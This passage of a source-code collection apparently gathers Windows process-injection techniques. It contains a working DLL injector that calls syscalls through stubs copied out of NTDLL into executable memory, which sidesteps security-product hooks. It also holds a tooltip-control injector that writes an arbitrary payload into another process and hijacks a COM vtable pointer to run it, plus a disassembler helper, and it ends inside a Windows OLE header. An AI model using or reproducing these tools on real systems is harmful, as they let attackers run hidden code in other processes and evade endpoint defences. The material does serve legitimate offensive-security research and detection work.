        end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem;
        len = (SIZE_T) (end - start);

        // allocate RWX memory
        cs = VirtualAlloc(NULL, len, 
          MEM_COMMIT | MEM_RESERVE,
          PAGE_EXECUTE_READWRITE);
          
        if(cs != NULL) {
          // copy system call code stub to memory
          CopyMemory(cs, (const void*)start, len);
        }
        break;
      }
    }
    
cleanup:
    if(mem != NULL) UnmapViewOfFile(mem);
    if(map != NULL) CloseHandle(map);
    if(file != NULL) CloseHandle(file);
    
    // return pointer to code stub or NULL
    return cs;
}

BOOL EnablePrivilege(PCHAR szPrivilege){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult) return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
    if(bResult){
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

      // adjust token
      AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
      bResult = GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return bResult;
}

// display error message for last error code
VOID xstrerror (PCHAR fmt, ...){
    PCHAR  error=NULL;
    va_list arglist;
    CHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    vsnprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPSTR)&error, 0, NULL))
    {
      printf("  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      printf("  [ %s error : %08lX\n", buffer, dwError);
    }
}

DWORD name2pid(PCHAR procName){
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          pid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(!lstrcmpi(pe32.szExeFile, procName)){
          pid=pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return pid;
}

BOOL IsElevated(VOID) {
    HANDLE          hToken;
    BOOL            bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD           dwSize;
      
    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
      if (GetTokenInformation (hToken, TokenElevation, &te,
          sizeof(TOKEN_ELEVATION), &dwSize)) {
        bResult = te.TokenIsElevated;
      }
      CloseHandle(hToken);
    }
    return bResult;
}

typedef HMODULE (WINAPI *LoadLibrary_t)(LPCTSTR);

VOID inject_dll(syscall_t *syscall, DWORD pid, PCHAR path) {
    SIZE_T            wr;
    LoadLibrary_t     _LoadLibrary;
    HANDLE            hp = NULL, ht = NULL;
    LPVOID            ds=NULL;
    SIZE_T            path_len = lstrlen(path);
    NTSTATUS          nts;
    CLIENT_ID         cid = {0};
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    LARGE_INTEGER     li;
    
    if(!IsElevated()) {
      printf("WARNING: You're running this application from a restricted process.\n");
    }
    
    EnablePrivilege(SE_DEBUG_NAME);
    
    printf("1. Opening process %i ...", pid);
    cid.UniqueProcess = pid;
    
    nts = syscall->NtOpenProcess(&hp, 
      PROCESS_ALL_ACCESS, &oa, &cid);
    
    if(nts >= 0) {
      path_len++;
      printf("OK\n2. Allocating read-write (RW) memory for %s ...", path);
      
      nts = syscall->NtAllocateVirtualMemory(
        hp, &ds, 0, &path_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);
      
      if(nts >= 0) {    
        printf("OK\n3. Copying %s to remote process ...", path);
        nts = syscall->NtWriteVirtualMemory(hp, ds, path, path_len-1, &wr);
        
        if(nts >= 0) {
          printf("OK\n4. Resolving the address of LoadLibrary.\n");
          _LoadLibrary = (LoadLibrary_t)GetProcAddress(
            GetModuleHandle("kernel32"), "LoadLibraryA");
        
          printf("5. Executing LoadLibrary in remote process..."); 
          // with DLL path as parameter
          nts = syscall->NtCreateThreadEx(
            &ht, MAXIMUM_ALLOWED, NULL, 
            hp, (LPTHREAD_START_ROUTINE)_LoadLibrary, 
            ds, 0, 0, 0, 0, NULL);
            
          if(ht != NULL) {
            printf("OK\n6. Waiting for thread to exit.\n");
            li.QuadPart = INFINITE;
            nts = syscall->NtWaitForSingleObject(ht, FALSE, &li);
            printf("7. Close thread handle.\n");
            syscall->NtClose(ht);
          } else printf("FAILED! %08X\n", nts);
        }
        printf("7. Free remote memory.\n");
        syscall->NtFreeVirtualMemory(hp, ds, 0, MEM_RELEASE);
      } else printf("FAILED! %08X\n", nts);
      printf("8. Closing process handle.\n");
      syscall->NtClose(hp);
    } else printf("FAILED! %08X\n", nts);
}

int main(int argc, char *argv[]) {
    syscall_t sc;
    DWORD     pid;
    
    if(argc != 3) {
      printf("usage: inject_dll <process name | id> <path of DLL>\n");
      return 0;
    }
    
    pid = strtoul(argv[1], NULL, 10);
    if(pid == 0) {
      pid = name2pid(argv[1]);
      if(pid == 0) {
        printf("unable to find process : %s\n", argv[1]);
        return -1;
      }
    }
    
    // resolve address of system calls
    sc.NtOpenProcess           = (NtOpenProcess_t)GetSyscallStub("NtOpenProcess");
    sc.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub("NtAllocateVirtualMemory");
    sc.NtWriteVirtualMemory    = (NtWriteVirtualMemory_t)GetSyscallStub("NtWriteVirtualMemory");
    sc.NtCreateThreadEx        = (NtCreateThreadEx_t)GetSyscallStub("NtCreateThreadEx");
    sc.NtWaitForSingleObject   = (NtWaitForSingleObject_t)GetSyscallStub("NtWaitForSingleObject");
    sc.NtFreeVirtualMemory     = (NtFreeVirtualMemory_t)GetSyscallStub("NtFreeVirtualMemory");
    sc.NtClose                 = (NtClose_t)GetSyscallStub("NtClose");
    
    if(sc.NtOpenProcess == NULL ||
       sc.NtAllocateVirtualMemory == NULL ||
       sc.NtWriteVirtualMemory == NULL ||
       sc.NtCreateThreadEx == NULL ||
       sc.NtWaitForSingleObject == NULL ||
       sc.NtFreeVirtualMemory == NULL ||
       sc.NtClose == NULL) {
      
      printf("unable to resolve address of some system calls.\n");
      printf("NtOpenProcess           : %p\n", sc.NtOpenProcess);
      printf("NtAllocateVirtualMemory : %p\n", sc.NtAllocateVirtualMemory);
      printf("NtWriteVirtualMemory    : %p\n", sc.NtWriteVirtualMemory);
      printf("NtCreateThreadEx        : %p\n", sc.NtCreateThreadEx);
      printf("NtWaitForSingleObject   : %p\n", sc.NtWaitForSingleObject);
      printf("NtFreeVirtualMemory     : %p\n", sc.NtFreeVirtualMemory);
      printf("NtClose                 : %p\n", sc.NtClose);
    } else {
      printf("Injecting %s into %s...\n", argv[2], argv[1]);
      inject_dll(&sc, pid, argv[2]);
    }
    
    return 0;
}

```

`syscalls/lde.cpp`:

```cpp


#include "lde.h"

LDE::LDE() {
    CHAR path[MAX_PATH];
    
    ctrl = NULL;
    clnt = NULL;
    // create a debugging client
    hr = DebugCreate(__uuidof(IDebugClient), (void**)&clnt);
    if(hr == S_OK) {
      printf("Querying interface...\n");
      // get the control interface
      hr = clnt->QueryInterface(__uuidof(IDebugControl2), (void**)&ctrl);
      if(hr == S_OK) {
        printf("Attaching to %ld...\n", GetProcessId(GetCurrentProcess()));
        // attach to existing process
        hr = clnt->AttachProcess(NULL, GetProcessId(GetCurrentProcess()), DEBUG_ATTACH_NONINVASIVE | DEBUG_ATTACH_NONINVASIVE_NO_SUSPEND);
        if(hr == S_OK) {
          printf("Waiting for events...\n");
          hr = ctrl->WaitForEvent(DEBUG_WAIT_DEFAULT, INFINITE);
        } else printf("ERROR: %08lX\n", hr);
      }
    }
    ExpandEnvironmentStrings("%SystemRoot%\\system32\\NTDLL.dll", path, MAX_PATH);
    // open file
    file = CreateFile(path, 
      GENERIC_READ, FILE_SHARE_READ, NULL, 
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(file == INVALID_HANDLE_VALUE) return;
    
    // create mapping
    map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
    if(map == NULL) return;
    
    // create view
    mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, NULL);
}

LDE::~LDE() {
    if(mem != NULL) UnmapViewOfFile(mem);
    if(map != NULL) CloseHandle(map);
    if(file != NULL) CloseHandle(file);
    
    if(ctrl != NULL) {
      ctrl->Release();
      ctrl = NULL;
    }
    
    // release client
    if(clnt != NULL) {
      clnt->DetachProcesses();
      clnt->Release();
      clnt = NULL;
    }
}

// return pointer to DOS header
PIMAGE_DOS_HEADER LDE::DosHdr(void) {
    return (PIMAGE_DOS_HEADER)mem;
}

// return pointer to NT header
PIMAGE_NT_HEADERS LDE::NtHdr(void) {
  DWORD v = DosHdr()->e_lfanew;
  
  if (v > 512) {
    //printf("%s is wrong\n", file);
    return NULL;
  }
  return (PIMAGE_NT_HEADERS) (mem + DosHdr()->e_lfanew);
}

// return pointer to File header
PIMAGE_FILE_HEADER LDE::FileHdr(void) {
  PIMAGE_NT_HEADERS nt = NtHdr();
  if (nt == NULL) return NULL;
  
  return &NtHdr()->FileHeader;
}
// determines CPU architecture of binary
BOOL LDE::is32(void) {
    PIMAGE_FILE_HEADER hdr = FileHdr();
    if (hdr == NULL) return FALSE;
    
    return FileHdr()->Machine==IMAGE_FILE_MACHINE_I386;
}

// determines CPU architecture of binary
BOOL LDE::is64(void) {
    PIMAGE_FILE_HEADER hdr = FileHdr();
    if (hdr == NULL) return FALSE;
    
    return FileHdr()->Machine == IMAGE_FILE_MACHINE_AMD64;
}

// return pointer to Optional header
LPVOID LDE::OptHdr(void) {
    return (LPVOID)&NtHdr()->OptionalHeader;
}

// return pointer to first section header
PIMAGE_SECTION_HEADER LDE::SecHdr(void) {
    PIMAGE_NT_HEADERS nt = NtHdr();
    if (nt == NULL) return NULL;
    
    return (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
    nt->FileHeader.SizeOfOptionalHeader);
}

DWORD LDE::DirSize(void) {
    if (is32()) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->NumberOfRvaAndSizes;
    } else if (is64()) {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->NumberOfRvaAndSizes;
    }
    return 0;
}

DWORD LDE::SecSize(void) {
    return NtHdr()->FileHeader.NumberOfSections;
}

PIMAGE_DATA_DIRECTORY LDE::Dirs(void) {
    if (DirSize() == 0) return NULL;
    
    if (is32()) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->DataDirectory;
    } else if (is64()) {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->DataDirectory;
    }
    return NULL;
}

ULONGLONG LDE::ImgBase(void) {
    if (is32()) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->ImageBase;
    } else if (is64()) {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->ImageBase;
    }
    return 0;
}

ULONG64 LDE::rva2ofs(DWORD rva) {
    PIMAGE_SECTION_HEADER	sec;
    int				            i;
    
    if (rva == 0) return -1;
    sec = SecHdr();
    
    if (sec==0) return -1;
    
    for (i = SecSize() - 1; i >= 0; i--) {
      if (sec[i].VirtualAddress <= rva &&
        rva <= (DWORD)sec[i].VirtualAddress + sec[i].SizeOfRawData)
      {
        return sec[i].PointerToRawData + rva - sec[i].VirtualAddress;
      }
    }
    return -1;
}

FARPROC LDE::GetProcAddress(LPCSTR lpProcName) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, ofs, cnt;
    PCHAR                   str;
    PDWORD                  adr, sym;
    PWORD                   ord;
    
    if(mem == NULL || lpProcName == NULL) return NULL;
    
    // get pointer to directory
    dir = Dirs();
    
    // no exports? exit
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(rva == 0) return NULL;
    
    ofs = rva2ofs(rva);
    if(ofs == -1) return NULL;
    
    // no exported symbols? exit
    exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + mem);
    cnt = exp->NumberOfNames;
    if(cnt == 0) return NULL;
    
    // read the array containing address of api names
    ofs = rva2ofs(exp->AddressOfNames);        
    if(ofs == -1) return NULL;
    sym = (PDWORD)(ofs + mem);

    // read the array containing address of api
    ofs = rva2ofs(exp->AddressOfFunctions);        
    if(ofs == -1) return NULL;
    adr = (PDWORD)(ofs + mem);
    
    // read the array containing list of ordinals
    ofs = rva2ofs(exp->AddressOfNameOrdinals);
    if(ofs == -1) return NULL;
    ord = (PWORD)(ofs + mem);
    
    // scan symbol array for api string
    do {
      str = (PCHAR)(rva2ofs(sym[cnt - 1]) + mem);
      // found it?
      if(lstrcmp(str, lpProcName) == 0) {
        // return the address
        return (FARPROC)(rva2ofs(adr[ord[cnt - 1]]) + mem);
      }
    } while (--cnt);
    return NULL;
}

LPVOID LDE::GetSyscallStub(LPCSTR lpSyscallName) {
    ULONG64                       ofs, start=0, end=0, addr;
    PIMAGE_DOS_HEADER             dos;
    PIMAGE_NT_HEADERS             nt;
    PIMAGE_DATA_DIRECTORY         dir;
    PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
    DWORD                         i, rva;
    SIZE_T                        len;
    LPVOID                        cs = NULL;
    
    // resolve address of function in NTDLL
    addr = (ULONG64)GetProcAddress(lpSyscallName);
    if(addr == NULL) return NULL;
    
    // get pointer to image directories
    dir = Dirs();
    
    // no exception directory? exit
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    if(rva == 0) return NULL;
    
    ofs = rva2ofs(rva);
    if(ofs == -1) return NULL;
    
    rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);

    // for each runtime function (there might be a better way??)
    for(i=0; rf[i].BeginAddress != 0; i++) {
      // is it our system call?
      start = rva2ofs(rf[i].BeginAddress) + (ULONG64)mem;
      if(start == addr) {
        // save the end and calculate length
        end = rva2ofs(rf[i].EndAddress) + (ULONG64)mem;
        len = (SIZE_T) (end - start);
        
        // allocate RWX memory
        cs = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(cs != NULL) {
          // copy stub to memory
          CopyMemory(cs, (const void*)start, len);
        }
        break;
      }
    }
    // return pointer to code stub
    return cs;
}

bool LDE::DisassembleSyscall(LPCSTR lpSyscallName) {
    ULONG64                       ofs, start=0, end=0, addr;
    PIMAGE_DOS_HEADER             dos;
    PIMAGE_NT_HEADERS             nt;
    PIMAGE_DATA_DIRECTORY         dir;
    PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
    DWORD                         i, rva;
    CHAR                          buf[LDE_MAX_STR];
    HRESULT                       hr;
    ULONG                         len;
    
    // resolve address of function in NTDLL
    addr = (ULONG64)GetProcAddress(lpSyscallName);
    if(addr == NULL) return false;
    
    /** get pointer to image directories
    dir = Dirs();
    
    // no exception directory? exit
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    if(rva == 0) return false;
    
    ofs = rva2ofs(rva);
    if(ofs == -1) return false;
    
    rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);

    // for each runtime function (there might be a better way??)
    for(i=0; rf[i].BeginAddress != 0; i++) {
      // is it our system call?
      start = rva2ofs(rf[i].BeginAddress) + (ULONG64)mem;
      if(start == addr) {
        // save end and exit search
        end = rva2ofs(rf[i].EndAddress) + (ULONG64)mem;
        break;
      }
    }*/
    
    printf("Disassembling %p\n", (PVOID)addr);
    start = addr;

    for(;;) {
      hr = ctrl->Disassemble(
            start, 
            0, 
            buf, 
            LDE_MAX_STR, 
            &len, 
            &start
            );
        
      if(hr != S_OK) {
        printf("Done %08lX\n", hr);
        break;
      }
      printf("%s", buf);
    }
    return false;
}

bool LDE::Disassemble(lde_insn_t *inst) {
    ULONG i, j, dislen;
    int   val;
    int   x, ofs, instlen;
    
    // Disassemble instruction at current address
    hr = ctrl->Disassemble(
      inst->addr, 0, inst->buf, LDE_MAX_STR,
      &dislen, &inst->ofs);
    
    // Error? return
    if(hr != S_OK) return false;
    
    // Calculate the length of opcode
    inst->size = (inst->ofs - inst->addr);
    
    // Skip the address
    for(i=0; inst->buf[i] != ' ' && i < dislen; i++);
    
    // Find code bytes
    for(;inst->buf[i] == ' '; i++);
    
    // Convert bytes to binary
    for(j=0; inst->buf[i] != ' ' && i < dislen; i += 2, j++) {
      sscanf (&inst->buf[i], "%2x", &val);
      inst->code[j] = (BYTE)val;
    }
    
    // Inspect opcode
    x = inst->code[0];
    inst->target = 0;

    // is it a branch?
    if(((x & 0xF0) == 0x70) ||
       ((x & 0xF0) == 0xE0 && x != 0xE8) ||
       (x == 0x0F) && 
       (inst->code[1] >= 0x81) && 
       (inst->code[1] <= 0x8F)) 
    {  
      // short?
      if(inst->size == 2) {
        ofs = inst->code[1];
        if(ofs & 0x80) {
          inst->target = inst->addr - (0xFF - ofs - 1);
        } else {
          inst->target = inst->addr + inst->size + ofs;
        }
      } else {
        instlen = inst->size - 2;
        if(x == 0xE9) instlen++;
        ofs = 0;
        // long?
        for(i=0; i<instlen; i++) {
          ofs <<= 8;
          ofs |= inst->code[inst->size - i - 1];
        }
        if(ofs & 0x80000000) {          
          inst->target = inst->addr - (0xFFFFFFFF - ofs - 4);
        } else {
          inst->target = inst->addr + inst->size + ofs;
        }
      }
    }
    return true;
}

```

`syscalls/lde.h`:

```h

#ifndef LDE_H
#define LDE_H

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <dbgeng.h>

#pragma comment(lib, "dbgeng.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "shell32.lib")

#define LDE_OPCODE_JO   0x70 // JO
#define LDE_OPCODE_JNO  0x71 // JNO
#define LDE_OPCODE_JB   0x72 // JB
#define LDE_OPCODE_JAE  0x73 // JAE
#define LDE_OPCODE_JE   0x74 // JE
#define LDE_OPCODE_JNE  0x75 // JNE
#define LDE_OPCODE_JBE  0x76 // JBE
#define LDE_OPCODE_JA   0x77 // JA
#define LDE_OPCODE_JS   0x78 // JS
#define LDE_OPCODE_JNS  0x79 // JNS
#define LDE_OPCODE_JP   0x7A // JP
#define LDE_OPCODE_JPO  0x7B // JPO
#define LDE_OPCODE_JNGE 0x7C // JNGE
#define LDE_OPCODE_JNL  0x7D // JNL
#define LDE_OPCODE_JNG  0x7E // JNG
#define LDE_OPCODE_JNLE 0x7F // JNLE
       
#define LDE_MAX_STR 260

typedef struct _lde_insn_t {
    ULONG64 size, addr, ofs, target;
    DWORD   type;
    BYTE    code[16];
    CHAR    buf[LDE_MAX_STR];
} lde_insn_t;

class LDE {
  private:
    HANDLE               file, map;
    LPBYTE               mem;
    HRESULT              hr;
    IDebugClient         *clnt;
    IDebugControl2       *ctrl;
    
    PIMAGE_DOS_HEADER DosHdr(void);
    PIMAGE_NT_HEADERS NtHdr(void);
    PIMAGE_FILE_HEADER FileHdr(void);
    BOOL is32(void);
    BOOL is64(void);
    LPVOID OptHdr(void);
    PIMAGE_SECTION_HEADER SecHdr(void);
    DWORD DirSize(void);
    DWORD SecSize(void);
    PIMAGE_DATA_DIRECTORY Dirs(void);
    ULONGLONG ImgBase(void);
    ULONG64 rva2ofs(DWORD rva);
    
  public:
    LDE();
    ~LDE();
    
    bool Disassemble(lde_insn_t*);
    FARPROC GetProcAddress(LPCSTR);
    bool DisassembleSyscall(LPCSTR);
    LPVOID GetSyscallStub(LPCSTR);
};

#endif

```

`syscalls/test.cpp`:

```cpp

#include "lde.h"

int 
main(int argc, char *argv[]) {
    LDE *lde;
    
    if(argc != 2) {
      printf("usage: dis <system call name>\n");
      return 0;
    }
    
    // create length disassembly engine
    lde = new LDE();
      
    lde->DisassembleSyscall(argv[1]);

    delete lde;
    
    return 0;
}
```

`tooltip/tip.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"
  
typedef struct _IUnknown_VFT {
    // IUnknown
    LPVOID QueryInterface;
    LPVOID AddRef;
    LPVOID Release;
    
    // CToolTipsMgr
    LPVOID ptrs[128];
} IUnknown_VFT;

VOID commctrl_inject(LPVOID payload, DWORD payloadSize) {
    HWND         hw = 0;
    SIZE_T       rd, wr;
    LPVOID       ds, cs, p, ptr;
    HANDLE       hp;
    DWORD        pid;
    IUnknown_VFT unk;
    
    // 1. find a tool tip window.
    //    read index zero of window bytes
    hw = FindWindow(L"tooltips_class32", NULL);
    p  = (LPVOID)GetWindowLongPtr(hw, 0);
    GetWindowThreadProcessId(hw, &pid);
    
    // 2. open the process and read CToolTipsMgr
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &rd);
    ReadProcessMemory(hp, ptr, &unk, sizeof(unk), &rd);
    
    //printf("HWND : %p Heap : %p PID : %i vftable : %p\n", 
      // hw, p, pid, ptr);
    
    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. allocate RW memory and write new CToolTipsMgr
    unk.AddRef = cs;
    ds = VirtualAllocEx(hp, NULL, sizeof(unk),
      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hp, ds, &unk, sizeof(unk), &wr);
    
    // 5. update pointer, trigger execution
    WriteProcessMemory(hp, p, &ds, sizeof(ULONG_PTR), &wr);
    PostMessage(hw, WM_USER, 0, 0);

    // sleep for moment
    Sleep(1);
    
    // 6. restore original pointer and cleanup
    WriteProcessMemory(hp, p, &ptr, sizeof(ULONG_PTR), &wr);    
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

// WorkerA or WorkerW created by SHCreateWorkerWindowW
BOOL IsClassPtr(HWND hwnd, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res, pid;
    HANDLE                   hp;
    LPVOID                   ds;
    SIZE_T                   rd;
    BOOL                     bClass = FALSE;
    
    if(ptr == NULL) return FALSE;
    
    GetWindowThreadProcessId(hwnd, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return FALSE;
    
    // read first value of pointer
    ReadProcessMemory(hp, ptr, &ds, sizeof(ULONG_PTR), &rd);
    
    // query the pointer
    res = VirtualQueryEx(hp, ds, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;
    
    bClass = ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_IMAGE     ) && 
              (mbi.Protect == PAGE_READONLY));
            
    CloseHandle(hp);    
    return bClass;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    WCHAR    cls[MAX_PATH];
    PWCHAR   filter = (PWCHAR)lParam;
    LPVOID   cs;
    DWORD    pid;
    
    GetClassName(hwnd, cls, MAX_PATH);
    
    // filter specified?
    if(filter != NULL) {
      // does class match our filter? skip printing if not
      if(StrStrI(cls, filter) == NULL) goto L1;
    }
    cs = (LPVOID)GetWindowLongPtr(hwnd, 0);
    GetWindowThreadProcessId(hwnd, &pid);
    
    if(IsClassPtr(hwnd, cs)) {
      printf("%16p %16p %-40ws %-5i %ws\n", 
          hwnd, cs, cls, pid, wnd2proc(hwnd));
    }
    
L1:
    EnumChildWindows(hwnd, EnumWindowsProc, lParam);
    
    return TRUE;
}

VOID commctrl_list(PWCHAR filter) {
    printf("%-16s %-16s %-40s %-5s %s\n", 
      "HWND", "WindowBytes", "Class", "PID", "Process");
    printf("*******************************************"
    "***************************************************\n");
      
    EnumWindows(EnumWindowsProc, (LPARAM)filter);
}
    
int main(void) {
    int     argc;
    WCHAR   **argv;
    LPVOID  pic;
    DWORD   len;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    // inject payload into process via tooltips_class32 control
    if(argc != 2) {
      printf("usage: tooltip_inject <payload.bin>\n");
      return 0;
    }
    
    // inject payload?
    len = readpic(argv[1], &pic);
    if(len != 0) {
      commctrl_inject(pic, len);
    } else {
      printf("unable to read from %ws\n", argv[1]);
      commctrl_list(argv[1]);
    }
    return 0;
}

```

`tpp/oletls.h`:

```h
// Licensed to the .NET Foundation under one or more agreements.
// The .NET Foundation licenses this file to you under the MIT license.
// See the LICENSE file in the project root for more information.
//+---------------------------------------------------------------------------
//
//  File:       oletls.h
//

//
//  Purpose:    manage thread local storage for OLE
//
//  Notes:      The gTlsIndex is initialized at process attach time.
//              The per-thread data is allocated in CoInitialize in
//              single-threaded apartments or on first use in
//              multi-threaded apartments.
//
//----------------------------------------------------------------------------

#ifndef _OLETLS_H_
#define _OLETLS_H_

/**
#ifndef FEATURE_COMINTEROP_APARTMENT_SUPPORT
#error FEATURE_COMINTEROP_APARTMENT_SUPPORT is required for this file
#endif // FEATURE_COMINTEROP_APARTMENT_SUPPORT
*/
//+---------------------------------------------------------------------------
//
// forward declarations (in order to avoid type casting when accessing
// data members of the SOleTlsData structure).
//
//+---------------------------------------------------------------------------

/**
class  CAptCallCtrl;                        // see callctrl.hxx
class  CSrvCallState;                       // see callctrl.hxx
class  CObjServer;                          // see sobjact.hxx
class  CSmAllocator;                        // see stg\h\smalloc.hxx
class  CMessageCall;                        // see call.hxx
class  CClientCall;                         // see call.hxx
class  CAsyncCall;                          // see call.hxx
class  CClipDataObject;                     // see ole232\clipbrd\clipdata.h
class  CSurrogatedObjectList;               // see com\inc\comsrgt.hxx
class  CCtxCall;                            // see PSTable.hxx
class  CPolicySet;                          // see PSTable.hxx
class  CObjectContext;                      // see context.hxx
class  CComApartment;                       // see aprtmnt.hxx
*/

//+-------------------------------------------------------------------
//
//  Struct:     CallEntry
//
//  Synopsis:   Call Table Entry.
//
//+-------------------------------------------------------------------
typedef struct _tagCallEntry {
    void  *pNext;        // ptr to next entry
    void  *pvObject;     // Entry object
} CallEntry;

struct LockEntry;
// RWLock state inside TLS
typedef struct _tagLockEntry {
    struct LockEntry *pNext;    // next entry
    struct LockEntry *pPrev;    // prev entry
    LONG dwULockID;
    LONG dwLLockID;         // owning lock
    WORD wReaderLevel;      // reader nesting level
} LockEntry;

//+---------------------------------------------------------------------------
//
//  Enum:       OLETLSFLAGS
//
//  Synopsys:   bit values for dwFlags field of SOleTlsData. If you just want
//              to store a BOOL in TLS, use this enum and the dwFlag field.
//
//+---------------------------------------------------------------------------
typedef enum tagOLETLSFLAGS
{
    OLETLS_LOCALTID             = 0x01,   // This TID is in the current process.
    OLETLS_UUIDINITIALIZED      = 0x02,   // This Logical thread is init'd.
    OLETLS_INTHREADDETACH       = 0x04,   // This is in thread detach. Needed
                                          // due to NT's special thread detach
                                          // rules.
    OLETLS_CHANNELTHREADINITIALZED = 0x08,// This channel has been init'd
    OLETLS_WOWTHREAD            = 0x10,   // This thread is a 16-bit WOW thread.
    OLETLS_THREADUNINITIALIZING = 0x20,   // This thread is in CoUninitialize.
    OLETLS_DISABLE_OLE1DDE      = 0x40,   // This thread can't use a DDE window.
    OLETLS_APARTMENTTHREADED    = 0x80,   // This is an STA apartment thread
    OLETLS_MULTITHREADED        = 0x100,  // This is an MTA apartment thread
    OLETLS_IMPERSONATING        = 0x200,  // This thread is impersonating
    OLETLS_DISABLE_EVENTLOGGER  = 0x400,  // Prevent recursion in event logger
    OLETLS_INNEUTRALAPT         = 0x800,  // This thread is in the NTA
    OLETLS_DISPATCHTHREAD       = 0x1000, // This is a dispatch thread
    OLETLS_HOSTTHREAD           = 0x2000, // This is a host thread
    OLETLS_ALLOWCOINIT          = 0x4000, // This thread allows inits
